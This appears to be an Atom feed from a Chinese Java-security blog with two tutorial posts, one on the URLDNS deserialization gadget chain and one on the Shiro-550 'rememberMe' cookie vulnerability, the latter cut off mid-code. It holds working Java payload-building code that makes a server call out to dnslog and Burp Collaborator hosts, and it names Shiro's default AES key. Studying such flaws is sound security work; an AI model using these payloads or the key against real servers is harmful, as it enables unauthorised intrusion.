<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s1eep123のblog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-01T00:55:00.670Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>URLDNS链</title>
    <link href="http://example.com/2022/08/11/urldns/"/>
    <id>http://example.com/2022/08/11/urldns/</id>
    <published>2022-08-11T13:16:50.000Z</published>
    <updated>2022-09-01T00:55:00.670Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><ol><li><p>概述</p><p>URLDNS 就是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作“利用链”。因为其参数不不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。</p><p>虽然这个“利用链”实际上是不能“利用”的，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用：</p><ul><li>使用Java内置的类构造，对第三方库没有依赖</li><li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul></li><li><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure></li><li><p>HashMap底层原理</p><ul><li><p>HashMap是Map的一个实现类，以数组+(链表或红黑树)实现。它是以键值对存储数据的，Key-Value都是Map.Entry中的属性</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828132806229.png" alt="image-20220828132806229">  </p></li><li><p>在实例化以后，底层创建了长度是16的一维数组<code>Entry[] table</code>,其中每个节点用Node表示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Node(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="built_in">this</span>.hash = hash;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>当put一个键值对时，首先对key进行hash，其中hash中又调用hashcode方法，之后添加tab数组中添加node,源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>原理利用</p><ul><li><p>java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            table = tab;</span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u); <span class="comment">//解析域名，发出DNS请求</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br></pre></td></tr></table></figure></li><li><p>因此利用链就很显而易见了</p></li></ul></li><li><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        URL url = new URL(&quot;https://pxqb7n.dnslog.cn&quot;);</span><br><span class="line">        hashMap.put(url,123);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828134354439.png" alt="image-20220828134354439"> </p><p>可以看到收到DNS请求，下面将hashMap序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于new URL()中的hashCode=-1，因此反序列化时，不能进入DNS解析，因此需反射设置hashCode！=-1</span></span><br><span class="line">HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://6g01re.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldHashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        fieldHashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldHashCode.set(url,<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        fieldHashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="comment">//unSerialize(&quot;ser.bin&quot;);</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828135355921.png" alt="image-20220828135355921"> </p><p>可以看到put时为收到DNS请求</p><ul><li><p>反序列化时收到请求</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828135451319.png" alt="image-20220828135451319"></p></li></ul></li><li><p>总代码如下</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://dr8bqb.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">112233</span>);</span><br><span class="line"></span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">ooStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ooStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerialize</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oiStrean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oiStrean.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URLDNS链&quot;&gt;&lt;a href=&quot;#URLDNS链&quot; class=&quot;headerlink&quot; title=&quot;URLDNS链&quot;&gt;&lt;/a&gt;URLDNS链&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;概述&lt;/p&gt;
&lt;p&gt;URLDNS 就是ysoserial中一个利用链的名字，但准确</summary>
      
    
    
    
    <category term="java安全" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞</title>
    <link href="http://example.com/2022/08/06/shiro/"/>
    <id>http://example.com/2022/08/06/shiro/</id>
    <published>2022-08-06T13:16:50.000Z</published>
    <updated>2022-09-01T00:54:12.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ol><li><p>所需环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdk8u65 </span><br><span class="line">Tomcat8</span><br><span class="line">shiro 1.2.4</span><br></pre></td></tr></table></figure></li><li><p>shiro环境直接clone p神的<a href="https://github.com/phith0n/JavaThings">github地址</a></p></li><li><p>启动tomcat，即可看到</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830135606014.png" alt="image-20220830135606014"></p></li></ol><h4 id="Shiro550分析"><a href="#Shiro550分析" class="headerlink" title="Shiro550分析"></a>Shiro550分析</h4><h6 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h6><ol><li><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字</p><p>段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就</p><p>可以利用这个 rememberMe 进行反序列化，从而 getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">////Request</span><br><span class="line">POST /shirodemo_war/login.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.124.15:8081</span><br><span class="line">Content-Length: 56</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.124.15:8081</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.124.15:8081/shirodemo_war/login.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=root&amp;password=secret&amp;rememberMe=on&amp;submit=Login</span><br><span class="line"></span><br><span class="line">////Response</span><br><span class="line">HTTP/1.1 302 </span><br><span class="line">Set-Cookie: JSESSIONID=1467280596697A870D71F2A15C2E5B84; Path=/shirodemo_war; HttpOnly</span><br><span class="line">Set-Cookie: rememberMe=deleteMe; Path=/shirodemo_war; Max-Age=0; Expires=Mon, 29-Aug-2022 06:06:08 GMT</span><br><span class="line">Set-Cookie: rememberMe=TJ1wpcFQ6EgXmXmmHQ06fysKrMk3tVUeNsh42bYAnXePmFLX+a9DUp7SyfQcdXvFBHHEY0lPYFGP4TtwJA8MgiQVNrol9LIHlwzUlSkz2ZkCUkUYgW0aGK1Ben6bfU1wLp56z/ygIC0x1qXDDYzzRhdMHptkdPOCTJ1DVgtDP51AeESfhuKP/EVJI5JS+e/QTXReg8GtYowZ48PvWTf65YGwp+j+/LNCbn1Wsk1V5xYf9P7q2Xmm6Zh4C5nV2siStTq32oVYtmkowJSV9LCCTsjAZ0Nw+p5tGxsIbmJU3viTOh1PnMKT2XDEiYor7Jr/SKnjsWkYBWSkSvLs+sPRGwVXUVI1LZ3er9UIzsgWse/lOjXdJ8uV71CATvqaG+71HDy9S8byDEdIW1kMh7zigLTEKAp2edgJi3X19vIcoQBkB3ZSJSEcAwG3tCTfyeSnMFJjNa3NmJ+jMyYQO3Q/oZkSbn7fGRG5aIX0OILCDI7Mk9k9YnkIfijo60KrJEcc; Path=/shirodemo_war; Max-Age=31536000; Expires=Wed, 30-Aug-2023 06:06:08 GMT; HttpOnly</span><br><span class="line">Location: /shirodemo_war/;jsessionid=1467280596697A870D71F2A15C2E5B84</span><br><span class="line">Content-Length: 0</span><br><span class="line">Date: Tue, 30 Aug 2022 06:06:08 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></li><li><p>根本原因是AES 加密的密钥默认硬编码在代码里（Shiro-550）</p></li></ol><h6 id="cookie解密分析"><a href="#cookie解密分析" class="headerlink" title="cookie解密分析"></a>cookie解密分析</h6><ol><li><p>idea全局查找cookie关键字，发现一下与shiro框架相关的class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Cookie</span><br><span class="line">public class SimpleCookie implements Cookie</span><br><span class="line">public class CookieRememberMeManager extends AbstractRememberMeManager </span><br></pre></td></tr></table></figure></li><li><p>跟进CookieRememberMeManager查看相关函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830144844310.png" alt="image-20220830144844310"> </p><p>这个方法中先判断cookie base64后是否为deleteme，是的话则返回，否则base解密后返回，看看谁调用了这个方法</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145046096.png" alt="image-20220830145046096"> </p><p>跟进convertBytesToPrincipals看看</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145240622.png" alt="image-20220830145240622"> 、</p><p>此函数对base64解密后的byte流进行decrypt，然后反序列化。跟进看看</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830145403934.png" alt="image-20220830145403934"> </p><p>获取cipherService后对bytes解密</p><p>其中getDecryptionCipherKey()为获取加解秘钥</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151300954.png" alt="image-20220830151300954"> </p><p>跟进cipherService发现使用的是Aes加密，秘钥为base64加密的kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p></li><li><p>总结上述流程，发现shiro对cookie解密流程为</p><p>base64() -&gt; Aes() 之后得到序列化内容</p></li><li><p>跟进反序列化函数查看</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151913617.png" alt="image-20220830151913617"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830151851054.png" alt="image-20220830151851054"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152034059.png" alt="image-20220830152034059"></p></li></ol><h6 id="cookie加密分析"><a href="#cookie加密分析" class="headerlink" title="cookie加密分析"></a>cookie加密分析</h6><ol><li><p>在onSuccessfulLogin下断点</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152756753.png" alt="image-20220830152756753"> </p></li><li><p>可以看到token为明文</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830152856451.png" alt="image-20220830152856451"> </p></li><li><p>跟进</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153050246.png" alt="image-20220830153050246"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153157790.png" alt="image-20220830153157790"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153218152.png" alt="image-20220830153218152"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830153255567.png" alt="image-20220830153255567"> </p><p>可见和解密过程对称，以上就是cookie加解密全过程</p></li></ol><h6 id="shiro550利用"><a href="#shiro550利用" class="headerlink" title="shiro550利用"></a>shiro550利用</h6><ol><li><p>DNS探测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">URLDNS链</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://fudjktkkeq3jv7koksa072r6exkn8c.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldHashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        fieldHashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldHashCode.set(url,<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        fieldHashCode.set(url,-<span 